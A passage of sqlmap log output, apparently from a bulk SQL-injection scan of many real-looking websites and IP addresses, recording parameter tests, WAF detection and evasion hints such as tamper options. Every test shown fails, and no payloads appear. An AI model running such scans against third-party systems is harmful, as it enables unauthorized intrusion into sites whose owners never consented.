+404 (Not Found) - 1 times
+URL 48:
+GET http://216.92.113.105//?page_id=48
+do you want to test this URL? [Y/n/q]
+> Y
+[11:40:14] [INFO] testing URL 'http://216.92.113.105//?page_id=48'
+[11:40:14] [INFO] testing connection to the target URL
+[11:40:17] [INFO] heuristics detected web page charset 'ISO-8859-2'
+[11:40:17] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:40:17] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:40:19] [INFO] testing if the target URL is stable
+[11:40:22] [INFO] target URL is stable
+[11:40:22] [INFO] testing if GET parameter 'page_id' is dynamic
+sqlmap got a 301 redirect to 'http://216.92.113.105/?page_id=9063'. Do you want to follow? [Y/n] Y
+[11:40:25] [INFO] confirming that GET parameter 'page_id' is dynamic
+[11:40:29] [INFO] GET parameter 'page_id' is dynamic
+[11:40:31] [INFO] heuristics detected web page charset 'utf-8'
+[11:40:37] [WARNING] reflective value(s) found and filtering out
+[11:40:39] [ERROR] possible integer casting detected (e.g. "$page_id=intval($_REQUEST['page_id'])") at the back-end web application
+do you want to skip those kind of cases (and save scanning time)? [Y/n] Y
+[11:40:43] [INFO] skipping GET parameter 'page_id'
+[11:40:43] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:40:43] [INFO] skipping 'http://177.124.164.10:1881/index.php?homepage=http%3A%2F%2F177.124.167.141%2F/?console=panel'
+URL 49:
+GET http://195.230.27.190//user/login?destination=node
+do you want to test this URL? [Y/n/q]
+> Y
+[11:40:43] [INFO] testing URL 'http://195.230.27.190//user/login?destination=node'
+[11:40:43] [INFO] testing connection to the target URL
+[11:40:44] [CRITICAL] page not found (404)
+[11:40:44] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+[11:40:44] [INFO] skipping 'http://131.0.144.4:1881/index.php?homepage=http%3A%2F%2F131.0.146.254%2F/?console=panel'
+URL 50:
+GET https://sampar.nl//?s=
+do you want to test this URL? [Y/n/q]
+> Y
+[11:40:44] [INFO] testing URL 'https://sampar.nl//?s='
+[11:40:45] [INFO] testing connection to the target URL
+[11:40:46] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:40:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:40:51] [WARNING] reflective value(s) found and filtering out
+[11:40:51] [INFO] testing if the target URL is stable
+[11:40:52] [INFO] target URL is stable
+[11:40:52] [INFO] testing if GET parameter 's' is dynamic
+[11:40:55] [INFO] confirming that GET parameter 's' is dynamic
+[11:40:57] [INFO] GET parameter 's' is dynamic
+[11:41:00] [WARNING] heuristic (basic) test shows that GET parameter 's' might not be injectable
+[11:41:04] [INFO] skipping GET parameter 's'
+[11:41:04] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 51:
+GET http://118.103.20.5//other/detail/?id=212
+do you want to test this URL? [Y/n/q]
+> Y
+[11:41:04] [INFO] testing URL 'http://118.103.20.5//other/detail/?id=212'
+[11:41:04] [INFO] testing connection to the target URL
+[11:41:04] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:41:04] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:41:05] [INFO] testing if the target URL is stable
+[11:41:05] [INFO] target URL is stable
+[11:41:05] [INFO] testing if GET parameter 'id' is dynamic
+[11:41:05] [INFO] confirming that GET parameter 'id' is dynamic
+[11:41:06] [INFO] GET parameter 'id' is dynamic
+[11:41:06] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[11:41:07] [INFO] skipping GET parameter 'id'
+[11:41:07] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 52:
+GET http://185.41.163.33//city/front/change?name=Алексин
+do you want to test this URL? [Y/n/q]
+> Y
+[11:41:07] [INFO] testing URL 'http://185.41.163.33//city/front/change?name=Алексин'
+[11:41:07] [INFO] testing connection to the target URL
+[11:41:07] [ERROR] unable to retrieve page content, skipping to the next URL
+URL 53:
+GET http://195.230.27.79//user/login?destination=node
+do you want to test this URL? [Y/n/q]
+> Y
+[11:41:07] [INFO] testing URL 'http://195.230.27.79//user/login?destination=node'
+[11:41:07] [INFO] testing connection to the target URL
+[11:41:08] [CRITICAL] page not found (404)
+[11:41:08] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 54:
+GET http://188.138.70.234//?cl=brands
+do you want to test this URL? [Y/n/q]
+> Y
+[11:41:08] [INFO] testing URL 'http://188.138.70.234//?cl=brands'
+[11:41:08] [INFO] testing connection to the target URL
+[11:41:11] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:41:11] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:41:13] [INFO] testing if the target URL is stable
+[11:41:15] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:41:15] [INFO] searching for dynamic content
+[11:41:21] [INFO] dynamic content marked for removal (91 regions)
+[11:41:23] [INFO] testing if GET parameter 'cl' is dynamic
+sqlmap got a 301 redirect to 'http://www.sport-fischbacher.de/index.php?cl=start&redirected=1'. Do you want to follow? [Y/n] Y
+[11:41:26] [INFO] confirming that GET parameter 'cl' is dynamic
+[11:41:29] [INFO] GET parameter 'cl' is dynamic
+[11:41:31] [WARNING] heuristic (basic) test shows that GET parameter 'cl' might not be injectable
+[11:41:58] [INFO] skipping GET parameter 'cl'
+[11:41:58] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. You can give it a go with the switch '--text-only' if the target page has a low percentage of textual content (~5.33% of page content is text). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 55:
+GET http://120.27.24.104/tencent://Message/?Uin=3185941358&websiteName=客服露露&Menu=ye
+do you want to test this URL? [Y/n/q]
+> Y
+[11:41:58] [INFO] testing URL 'http://120.27.24.104/tencent://Message/?Uin=3185941358&websiteName=客服露露&Menu=ye'
+[11:41:58] [INFO] testing connection to the target URL
+[11:41:58] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:41:58] [WARNING] if the problem persists please check that the provided target URL is valid. In case that it is, you can try to rerun with the switch '--random-agent' turned on and/or proxy switches ('--ignore-proxy', '--proxy',...)
+[11:41:58] [ERROR] unable to connect to the target URL or proxy, skipping to the next URL
+URL 56:
+GET http://95.65.13.38//?mod=page&id=24
+do you want to test this URL? [Y/n/q]
+> Y
+[11:41:58] [INFO] testing URL 'http://95.65.13.38//?mod=page&id=24'
+[11:41:58] [INFO] testing connection to the target URL
+[11:42:00] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:42:00] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:42:02] [INFO] testing if the target URL is stable
+[11:42:03] [INFO] target URL is stable
+[11:42:03] [INFO] testing if GET parameter 'mod' is dynamic
+[11:42:13] [INFO] confirming that GET parameter 'mod' is dynamic
+[11:42:26] [WARNING] turning off pre-connect mechanism because of connection time out(s)
+[11:42:26] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:42:26] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
+[11:42:30] [INFO] GET parameter 'mod' is dynamic
+[11:42:33] [WARNING] heuristic (basic) test shows that GET parameter 'mod' might not be injectable
+[11:42:46] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:42:51] [INFO] skipping GET parameter 'mod'
+[11:42:51] [INFO] testing if GET parameter 'id' is dynamic
+[11:42:53] [INFO] confirming that GET parameter 'id' is dynamic
+[11:42:55] [INFO] GET parameter 'id' is dynamic
+sqlmap got a 302 redirect to 'http://95.65.13.38:80//index.php'. Do you want to follow? [Y/n] Y
+[11:43:12] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[11:43:20] [INFO] skipping GET parameter 'id'
+[11:43:20] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 57:
+GET http://193.124.186.181//?tmpl=component&print=1&page=
+do you want to test this URL? [Y/n/q]
+> Y
+[11:43:20] [INFO] testing URL 'http://193.124.186.181//?tmpl=component&print=1&page='
+[11:43:20] [INFO] testing connection to the target URL
+[11:43:21] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:43:21] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:43:23] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:43:23] [INFO] testing if the target URL is stable
+[11:43:24] [INFO] target URL is stable
+[11:43:24] [INFO] testing if GET parameter 'tmpl' is dynamic
+[11:43:25] [INFO] confirming that GET parameter 'tmpl' is dynamic
+[11:43:26] [INFO] GET parameter 'tmpl' is dynamic
+[11:43:27] [WARNING] heuristic (basic) test shows that GET parameter 'tmpl' might not be injectable
+[11:43:28] [INFO] skipping GET parameter 'tmpl'
+[11:43:28] [INFO] testing if GET parameter 'print' is dynamic
+[11:43:29] [WARNING] GET parameter 'print' does not appear dynamic
+[11:43:29] [WARNING] heuristic (basic) test shows that GET parameter 'print' might not be injectable
+[11:43:31] [INFO] skipping GET parameter 'print'
+[11:43:31] [INFO] testing if GET parameter 'page' is dynamic
+[11:43:32] [WARNING] GET parameter 'page' does not appear dynamic
+[11:43:33] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable
+[11:43:35] [INFO] skipping GET parameter 'page'
+[11:43:35] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:43:35] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 1 times
+URL 58:
+GET https://www.ndtcorp.co.jp///stocklist?category=2
+do you want to test this URL? [Y/n/q]
+> Y
+[11:43:35] [INFO] testing URL 'https://www.ndtcorp.co.jp///stocklist?category=2'
+[11:43:35] [INFO] testing connection to the target URL
+[11:43:39] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:43:41] [WARNING] reflective value(s) found and filtering out
+[11:43:41] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:43:41] [INFO] testing if the target URL is stable
+[11:43:43] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:43:43] [INFO] testing if GET parameter 'category' is dynamic
+[11:43:45] [INFO] confirming that GET parameter 'category' is dynamic
+[11:43:48] [INFO] GET parameter 'category' is dynamic
+[11:43:55] [ERROR] possible integer casting detected (e.g. "$category=intval($_REQUEST['category'])") at the back-end web application
+do you want to skip those kind of cases (and save scanning time)? [Y/n] Y
+[11:44:00] [INFO] skipping GET parameter 'category'
+[11:44:00] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 59:
+GET https://www.scrapbook-adhesives.com///mailchimp_consumer_signup?iframe=true&width=600&height=550
+do you want to test this URL? [Y/n/q]
+> Y
+[11:44:00] [INFO] testing URL 'https://www.scrapbook-adhesives.com///mailchimp_consumer_signup?iframe=true&width=600&height=550'
+[11:44:01] [INFO] testing connection to the target URL
+[11:44:02] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:44:04] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:44:04] [INFO] testing if the target URL is stable
+[11:44:05] [INFO] target URL is stable
+[11:44:05] [INFO] testing if GET parameter 'iframe' is dynamic
+[11:44:07] [WARNING] GET parameter 'iframe' does not appear dynamic
+[11:44:08] [WARNING] heuristic (basic) test shows that GET parameter 'iframe' might not be injectable
+[11:44:09] [INFO] skipping GET parameter 'iframe'
+[11:44:09] [INFO] testing if GET parameter 'width' is dynamic
+[11:44:11] [WARNING] GET parameter 'width' does not appear dynamic
+[11:44:12] [WARNING] heuristic (basic) test shows that GET parameter 'width' might not be injectable
+[11:44:14] [INFO] skipping GET parameter 'width'
+[11:44:14] [INFO] testing if GET parameter 'height' is dynamic
+[11:44:15] [WARNING] GET parameter 'height' does not appear dynamic
+[11:44:17] [WARNING] heuristic (basic) test shows that GET parameter 'height' might not be injectable
+[11:44:19] [INFO] skipping GET parameter 'height'
+[11:44:19] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 60:
+GET http://54.173.4.149/en///en/login/?registered=0
+do you want to test this URL? [Y/n/q]
+> Y
+[11:44:19] [INFO] testing URL 'http://54.173.4.149/en///en/login/?registered=0'
+[11:44:19] [INFO] testing connection to the target URL
+sqlmap got a 301 redirect to 'http://54.173.4.149:80/en/404.php'. Do you want to follow? [Y/n] Y
+[11:44:20] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:44:22] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:44:22] [INFO] testing if the target URL is stable
+[11:44:24] [WARNING] GET parameter 'registered' does not appear dynamic
+[11:44:26] [WARNING] heuristic (basic) test shows that GET parameter 'registered' might not be injectable
+[11:44:30] [INFO] skipping GET parameter 'registered'
+[11:44:30] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 61:
+GET http://portal.clubrunner.ca/4438/SingleEmail/Send?MemberId=Pf51vluA/ZoBvYJ+GA8XtQ==
+do you want to test this URL? [Y/n/q]
+> Y
+[11:44:30] [INFO] testing URL 'http://portal.clubrunner.ca/4438/SingleEmail/Send?MemberId=Pf51vluA/ZoBvYJ+GA8XtQ=='
+[11:44:31] [INFO] testing connection to the target URL
+[11:44:32] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:44:33] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:44:33] [INFO] testing if the target URL is stable
+[11:44:34] [INFO] target URL is stable
+[11:44:34] [INFO] testing if GET parameter 'MemberId' is dynamic
+[11:44:35] [WARNING] GET parameter 'MemberId' does not appear dynamic
+[11:44:36] [WARNING] heuristic (basic) test shows that GET parameter 'MemberId' might not be injectable
+[11:44:37] [INFO] skipping GET parameter 'MemberId'
+[11:44:37] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:44:37] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1 times
+URL 62:
+GET http://www.efr.de//?id=17
+do you want to test this URL? [Y/n/q]
+> Y
+[11:44:37] [INFO] testing URL 'http://www.efr.de//?id=17'
+[11:44:37] [INFO] testing connection to the target URL
+[11:44:38] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:44:40] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:44:40] [INFO] testing if the target URL is stable
+[11:44:41] [INFO] target URL is stable
+[11:44:41] [INFO] testing if GET parameter 'id' is dynamic
+[11:44:42] [WARNING] GET parameter 'id' does not appear dynamic
+[11:44:43] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[11:44:45] [INFO] skipping GET parameter 'id'
+[11:44:45] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 63:
+GET http://192.138.21.109//?format=feed&type=rss
+do you want to test this URL? [Y/n/q]
+> Y
+[11:44:45] [INFO] testing URL 'http://192.138.21.109//?format=feed&type=rss'
+[11:44:45] [INFO] testing connection to the target URL
+[11:44:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:44:46] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:44:46] [INFO] testing if the target URL is stable
+[11:44:47] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:44:47] [INFO] testing if GET parameter 'format' is dynamic
+[11:44:49] [INFO] heuristics detected web page charset 'ascii'
+[11:44:49] [INFO] confirming that GET parameter 'format' is dynamic
+[11:44:50] [WARNING] GET parameter 'format' does not appear dynamic
+[11:44:51] [WARNING] heuristic (basic) test shows that GET parameter 'format' might not be injectable
+[11:44:52] [INFO] skipping GET parameter 'format'
+[11:44:52] [INFO] testing if GET parameter 'type' is dynamic
+[11:44:53] [INFO] confirming that GET parameter 'type' is dynamic
+[11:44:54] [WARNING] GET parameter 'type' does not appear dynamic
+[11:44:55] [WARNING] heuristic (basic) test shows that GET parameter 'type' might not be injectable
+[11:44:57] [INFO] skipping GET parameter 'type'
+[11:44:57] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:44:57] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 1 times, 500 (Internal Server Error) - 7 times
+URL 64:
+GET http://204.51.181.214/StatusRole?all=true&role=Customer
+do you want to test this URL? [Y/n/q]
+> Y
+[11:44:57] [INFO] testing URL 'http://204.51.181.214/StatusRole?all=true&role=Customer'
+[11:44:57] [INFO] testing connection to the target URL
+[11:44:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:44:58] [INFO] testing if the target URL is stable
+[11:44:59] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:44:59] [INFO] testing if GET parameter 'all' is dynamic
+[11:44:59] [INFO] confirming that GET parameter 'all' is dynamic
+[11:45:00] [INFO] GET parameter 'all' is dynamic
+[11:45:00] [WARNING] heuristic (basic) test shows that GET parameter 'all' might not be injectable
+[11:45:01] [INFO] skipping GET parameter 'all'
+[11:45:01] [INFO] testing if GET parameter 'role' is dynamic
+[11:45:02] [INFO] confirming that GET parameter 'role' is dynamic
+[11:45:02] [INFO] GET parameter 'role' is dynamic
+[11:45:03] [WARNING] heuristic (basic) test shows that GET parameter 'role' might not be injectable
+[11:45:04] [INFO] skipping GET parameter 'role'
+[11:45:04] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 65:
+GET http://91.206.8.212//?page_id=1785
+do you want to test this URL? [Y/n/q]
+> Y
+[11:45:04] [INFO] testing URL 'http://91.206.8.212//?page_id=1785'
+[11:45:04] [INFO] testing connection to the target URL
+[11:45:05] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:45:06] [INFO] testing if the target URL is stable
+[11:45:07] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:45:07] [INFO] testing if GET parameter 'page_id' is dynamic
+sqlmap got a 301 redirect to 'http://91.206.8.212/?page_id=8045'. Do you want to follow? [Y/n] Y
+[11:45:09] [INFO] confirming that GET parameter 'page_id' is dynamic
+[11:45:11] [INFO] GET parameter 'page_id' is dynamic
+[11:45:15] [ERROR] possible integer casting detected (e.g. "$page_id=intval($_REQUEST['page_id'])") at the back-end web application
+do you want to skip those kind of cases (and save scanning time)? [Y/n] Y
+[11:45:16] [INFO] skipping GET parameter 'page_id'
+[11:45:16] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 66:
+GET http://216.201.189.240/login//account?action=display
+do you want to test this URL? [Y/n/q]
+> Y
+[11:45:16] [INFO] testing URL 'http://216.201.189.240/login//account?action=display'
+[11:45:16] [INFO] testing connection to the target URL
+[11:45:17] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:45:17] [INFO] testing if the target URL is stable
+[11:45:18] [INFO] target URL is stable
+[11:45:18] [INFO] testing if GET parameter 'action' is dynamic
+[11:45:19] [WARNING] GET parameter 'action' does not appear dynamic
+[11:45:19] [WARNING] heuristic (basic) test shows that GET parameter 'action' might not be injectable
+[11:45:20] [INFO] skipping GET parameter 'action'
+[11:45:20] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 67:
+GET http://67.20.104.136//?format=feed&type=rss
+do you want to test this URL? [Y/n/q]
+> Y
+[11:45:20] [INFO] testing URL 'http://67.20.104.136//?format=feed&type=rss'
+[11:45:20] [INFO] testing connection to the target URL
+[11:45:21] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:45:21] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:45:21] [INFO] testing if the target URL is stable
+[11:45:22] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:45:22] [INFO] testing if GET parameter 'format' is dynamic
+[11:45:23] [INFO] confirming that GET parameter 'format' is dynamic
+[11:45:24] [WARNING] GET parameter 'format' does not appear dynamic
+[11:45:25] [WARNING] heuristic (basic) test shows that GET parameter 'format' might not be injectable
+[11:45:25] [INFO] skipping GET parameter 'format'
+[11:45:25] [INFO] testing if GET parameter 'type' is dynamic
+[11:45:26] [INFO] confirming that GET parameter 'type' is dynamic
+[11:45:27] [WARNING] GET parameter 'type' does not appear dynamic
+[11:45:28] [WARNING] heuristic (basic) test shows that GET parameter 'type' might not be injectable
+[11:45:28] [INFO] skipping GET parameter 'type'
+[11:45:28] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:45:28] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 4 times, 404 (Not Found) - 3 times, 406 (Not Acceptable) - 1 times
+URL 68:
+GET http://202.194.232.126//?r=teacher
+do you want to test this URL? [Y/n/q]
+> Y
+[11:45:28] [INFO] testing URL 'http://202.194.232.126//?r=teacher'
+[11:45:28] [INFO] testing connection to the target URL
+[11:45:28] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:45:29] [INFO] testing if the target URL is stable
+[11:45:29] [INFO] target URL is stable
+[11:45:29] [INFO] testing if GET parameter 'r' is dynamic
+[11:45:29] [INFO] confirming that GET parameter 'r' is dynamic
+[11:45:30] [INFO] GET parameter 'r' is dynamic
+[11:45:30] [WARNING] heuristic (basic) test shows that GET parameter 'r' might not be injectable
+[11:45:30] [INFO] skipping GET parameter 'r'
+[11:45:30] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:45:30] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 4 times
+URL 69:
+GET http://223.165.8.10/ovirt-engine//userportal/?locale=en_US
+do you want to test this URL? [Y/n/q]
+> Y
+[11:45:30] [INFO] testing URL 'http://223.165.8.10/ovirt-engine//userportal/?locale=en_US'
+[11:45:30] [INFO] testing connection to the target URL
+sqlmap got a 302 redirect to 'https://223.165.8.10:443/ovirt-engine//userportal/UserPortal.html?locale=en_US'. Do you want to follow? [Y/n] Y
+[11:45:30] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:45:30] [INFO] testing if the target URL is stable
+[11:45:31] [WARNING] GET parameter 'locale' does not appear dynamic
+[11:45:31] [WARNING] heuristic (basic) test shows that GET parameter 'locale' might not be injectable
+[11:45:32] [INFO] skipping GET parameter 'locale'
+[11:45:32] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 70:
+GET http://133.242.205.217//?page_id=30
+do you want to test this URL? [Y/n/q]
+> Y
+[11:45:32] [INFO] testing URL 'http://133.242.205.217//?page_id=30'
+[11:45:32] [INFO] testing connection to the target URL
+sqlmap got a 301 redirect to 'http://133.242.205.217/?page_id=30'. Do you want to follow? [Y/n] Y
+[11:45:36] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:45:38] [INFO] testing if the target URL is stable
+[11:45:40] [WARNING] GET parameter 'page_id' does not appear dynamic
+[11:45:42] [WARNING] heuristic (basic) test shows that GET parameter 'page_id' might not be injectable
+[11:45:44] [INFO] skipping GET parameter 'page_id'
+[11:45:44] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 71:
+GET http://75.112.206.117//?X=dis
